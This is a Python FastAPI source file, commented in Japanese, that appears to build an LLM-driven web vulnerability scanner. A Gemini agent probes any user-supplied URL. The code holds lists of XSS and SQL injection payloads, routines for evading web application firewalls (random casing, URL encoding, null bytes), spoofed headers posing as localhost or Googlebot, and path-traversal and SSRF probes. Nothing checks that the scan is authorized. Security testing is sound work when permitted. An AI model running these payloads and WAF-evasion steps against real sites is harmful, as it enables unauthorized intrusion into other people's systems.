import os
import uvicorn
from fastapi import FastAPI, APIRouter, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from dotenv import load_dotenv
from typing import Optional, List, Dict
import asyncio
import httpx
import re
from bs4 import BeautifulSoup
import random
import string
import time
from urllib.parse import quote_plus

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory

# --- FastAPIとAPIRouterのインスタンスを生成 ---
load_dotenv()
app = FastAPI()
router = APIRouter()

# --- WAFバイパス手法を適用するヘルパー関数 ---
def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
    """
    指定されたバイパス手法をペイロードに適用する。
    """
    if bypass_technique == "case_obfuscation":
        # 大文字小文字をランダムに変更
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    elif bypass_technique == "url_encoding":
        # ペイロード全体をURLエンコード
        return quote_plus(payload)
    elif bypass_technique == "character_substitution":
        # 特定の文字を代替文字に置換 (例: ' ' -> '+')
        return payload.replace(" ", "+").replace("<", "%3C").replace(">", "%3E")
    elif bypass_technique == "add_null_byte":
        # ペイロードにヌルバイトを挿入
        return payload.replace("'", "%00'")
    return payload

# --- 脆弱性ペイロード生成関数 (変更なし) ---
def generate_xss_payloads(num_payloads: int = 5) -> List[str]:
    base_payloads = ["<script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>","javascript:alert('XSS');","';alert('XSS');//","<body onload='alert(\"XSS\")'>","<iframe src='javascript:alert(\"XSS\")'></iframe>","<a href='javascript:alert(\"XSS\")'>click</a>"]
    encoded_payloads = []
    for payload in base_payloads:
        if random.random() < 0.3:
            encoded_payloads.append(payload.encode('utf-8').hex())
            encoded_payloads.append("&#" + ";&#".join([str(ord(c)) for c in payload]))
    random_payloads = []
    for _ in range(num_payloads):
        random_chars = ''.join(random.choices(string.ascii_letters + string.digits + "'\"`()", k=random.randint(5, 15)))
        payload = f"<script>alert('{random_chars}')</script>"
        random_payloads.append(payload)
    return base_payloads + encoded_payloads + random_payloads
def generate_sqli_payloads(num_payloads: int = 5) -> List[str]:
    base_payloads = ["' OR 1=1--","' UNION SELECT NULL, NULL, NULL--","' OR '1'='1'#","admin' --","admin' #","sleep(5)","benchmark(10000000,MD5(1))"]
    blind_payloads = ["' AND 1=1--","' AND 1=2--","' OR 1=1--","' OR 1=2--","') AND ('1'='1'--","') AND ('1'='2'--"]
    random_payloads = []
    for _ in range(num_payloads):
        random_payload = f"'{random.choice(['OR','AND'])} '1'='1'-- {random.randint(1, 1000)}"
        random_payloads.append(random_payload)
    return base_payloads + blind_payloads + random_payloads

# --- ツール定義 ---
@tool
async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
    """
    指定されたURLにHTTPリクエストを送信し、複数のWAFバイパス手法を試行しながら脆弱性ペイロードをテストする。
    """
    # 複数のWAFバイパス手法
    bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
    
    # 複数のWAFバイパスヘッダー
    bypass_headers_list = [
        # 標準的なブラウザのヘッダー
        {},
        # WAFバイパス用ヘッダー1
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Forwarded-For': '127.0.0.1' # ローカルIPを偽装
        },
        # WAFバイパス用ヘッダー2
        {
            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)', # クローラーを偽装
            'Referer': 'https://www.google.com/' # 参照元を偽装
        }
    ]

    async with httpx.AsyncClient() as client:
        try:
            # 最初のペイロードでWAFの有無を確認
            initial_response = await client.request(method, url, data=data, headers=headers, timeout=15)
            
            # WAFバイパス試行
            for technique in bypass_techniques:
                for bypass_headers in bypass_headers_list:
                    
                    # ペイロードとヘッダーを組み合わせる
                    modified_data = apply_waf_bypass(data, technique) if data else None
                    combined_headers = {**(headers or {}), **bypass_headers}

                    try:
                        response_bypass = await client.request(method, url, data=modified_data, headers=combined_headers, timeout=15)
                        
                        # WAFバイパスが成功したかどうかを判断
                        # 例：元のリクエストがブロックされた（403, 406など）が、バイパス試行が成功した（200 OK）
                        if initial_response.status_code in [403, 406, 503] and response_bypass.status_code == 200:
                            return f"WAF Bypass SUCCESS with {technique} and {bypass_headers}! Original request was blocked ({initial_response.status_code}), but bypass was successful ({response_bypass.status_code}). Response Body: {response_bypass.text[:500]}"
                        
                        # 脆弱性検出ロジック (バイパス試行の結果を分析)
                        vulnerability_flags = []
                        response = response_bypass
                        
                        if payload_type == "sqli":
                            sql_error_patterns = [r"sql syntax", r"mysql", r"query error", r"unclosed quotation", r"driver error", r"postgis error", r"pg_error", r"ora-[0-9]+"]
                            if response.status_code == 500 or any(re.search(p, response.text, re.IGNORECASE) for p in sql_error_patterns):
                                vulnerability_flags.append("SQLI_ERROR_DETECTED")
                                
                        if payload_type == "xss":
                            if modified_data and str(modified_data) in response.text:
                                vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")

                        if payload_type == "path_traversal":
                            if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
                                vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")

                        if payload_type == "ssrf":
                            if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
                                vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
                        
                        flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
                        
                        if vulnerability_flags:
                             return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {response.text[:500]}"
                    
                    except httpx.HTTPStatusError as e:
                        # ステータスコードがエラーでも処理を続行
                        print(f"HTTP Error during bypass attempt: {e}")
                    except Exception as e:
                        # 他の予期せぬエラーもキャッチ
                        print(f"Unexpected error during bypass attempt: {e}")

            return "WAF bypass attempts failed. No vulnerabilities detected with these methods."
            
        except httpx.RequestError as e:
            raise HTTPException(status_code=500, detail=f"Request Error: {e}")

@tool
async def detect_waf(url: str) -> str:
    """
    指定されたURLに対してWAF (Web Application Firewall) の有無を検出する。
    """
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=10)
            waf_indicators = {"Cloudflare": "cloudflare", "Sucuri": "sucuri", "AWS WAF": "awselb", "Imperva": "imperva", "Akamai": "akamai", "Wordfence": "wordfence"}
            for indicator, name in waf_indicators.items():
                if name in response.headers.get('Server', '').lower() or name in response.text.lower():
                    return f"WAF detected: {indicator}"
            return "No known WAF detected."
    except httpx.RequestError as e:
        raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")

# --- Pydantic モデル定義 (変更なし) ---
class TechStackItem(BaseModel):
    name: str = Field(..., description="技術スタックの名前 (例: 'PHP', 'WordPress')")
    version: Optional[str] = Field(None, description="バージョン情報")
class ScanInput(BaseModel):
    url: str = Field(..., description="スキャン対象のベースURL")
    target_endpoint: str = Field(..., description="脆弱性をテストするエンドポイント (例: '/search.php')")
    tech_stack: Optional[List[TechStackItem]] = Field(None, description="ターゲットの技術スタック情報")
    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf"], description="診断する脆弱性タイプ")

# --- APIエンドポイント ---
@router.post("/start_scan")
async def start_scan(scan_input: ScanInput):
    llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
    
    tools = [
        send_http_request_with_payload, 
        detect_waf,
    ]
    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)
    
    agent_prompt = ChatPromptTemplate.from_messages([
        ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
        ("system", "ユーザーが提供する情報に基づき、段階的に脆弱性を検証してください。"),
        ("system", "あなたの思考プロセスは以下のステップに従います: 1. `detect_waf`ツールでWAFの有無を調べる。2. その結果とユーザー入力に基づいて、最適な攻撃ペイロードを生成する。3. `send_http_request_with_payload`ツールでペイロードを試行する。このツールは、複数のWAFバイパス手法を自動的に試行します。4. 応答に含まれる**Flags**とレスポンス内容を分析し、脆弱性候補を判断する。5. 複数のペイロードでテストを繰り返す。6. 脆弱性が確認できたら、詳細な報告書を生成する。"),
        ("system", "攻撃ペイロードの生成、応答の分析、報告書の作成はすべてあなたの思考プロセスで行い、必要に応じて適切なツールを呼び出してください。"),
        ("system", "特に、Path Traversalではペイロードとして`../`や`..\\`などを、SSRFでは`http://127.0.0.1`や`http://10.0.0.1`などを試行し、`Flags`の出力を注意深く観察してください。"),
        MessagesPlaceholder("chat_history"),
        ("human", "{input}"),
        MessagesPlaceholder("agent_scratchpad"),
    ])
    
    agent = create_tool_calling_agent(llm, tools, agent_prompt)
    agent_executor = AgentExecutor(
        agent=agent,
        tools=tools,
        verbose=True,
        memory=memory
    )
    
    tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack]) if scan_input.tech_stack else "情報なし"

    initial_input = f"""
    ターゲットURL: {scan_input.url}
    攻撃対象エンドポイント: {scan_input.target_endpoint}
    技術スタック: {tech_stack_str}
    診断する脆弱性タイプ: {', '.join(scan_input.vulnerability_types)}
    上記情報に基づき、脆弱性スキャンを開始してください。
    """
    
    try:
        result = await agent_executor.ainvoke({"input": initial_input})
        final_report = result.get('output', '診断中に予期せぬエラーが発生しました。')
        return {"status": "scanning_complete", "final_report": final_report}
    except Exception as e:
        return {"status": "error", "final_report": f"診断中にエラーが発生しました: {e}"}

# --- ヘルスチェックとフロントエンド (変更なし) ---
@app.get("/health")
async def health_check():
    return {"status": "ok"}
@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    html_content = """
    <!DOCTYPE html><html><head><title>脆弱性スキャナー</title><style>body { font-family: sans-serif; margin: 2em; } input, button { padding: 0.5em; margin-top: 0.5em; } #output { margin-top: 1em; padding: 1em; border: 1px solid #ccc; background-color: #f9f9f9; white-space: pre-wrap; word-wrap: break-word; }</style></head><body><h1>脆弱性スキャン</h1><p>ターゲット情報を入力してスキャンを開始してください。</p><hr><label for="url">ベースURL:</label><br><input type="text" id="url" value="http://localhost:8000" size="50"><br><label for="endpoint">攻撃対象エンドポイント:</label><br><input type="text" id="endpoint" value="/search" size="50"><br><label for="tech_stack">技術スタック (カンマ区切り):</label><br><input type="text" id="tech_stack" value="WordPress 5.8, Apache 2.4.46" size="50"><br><button onclick="startScan()">スキャン開始</button><div id="output"></div><script>async function startScan() { const url = document.getElementById('url').value; const endpoint = document.getElementById('endpoint').value; const techStackInput = document.getElementById('tech_stack').value; const outputDiv = document.getElementById('output'); outputDiv.textContent = 'スキャンを開始しています...'; const techStackArray = techStackInput.split(',').map(item => { const parts = item.trim().split(' '); const name = parts.shift(); const version = parts.join(' ') || null; return { name: name, version: version }; }); const scanData = { url: url, target_endpoint: endpoint, tech_stack: techStackArray, vulnerability_types: ["xss", "sql_injection", "path_traversal", "ssrf"] }; try { const response = await fetch('/start_scan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(scanData) }); const result = await response.json(); if (response.ok) { outputDiv.textContent = 'スキャン完了\\n\\n' + result.final_report; } else { outputDiv.textContent = 'エラー: ' + (result.detail || JSON.stringify(result)); } } catch (error) { outputDiv.textContent = 'ネットワークエラー: ' + error.message; } }</script></body></html>
    """
    return HTMLResponse(content=html_content)

# --- FastAPI ルーティング (変更なし) ---
app.include_router(router)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
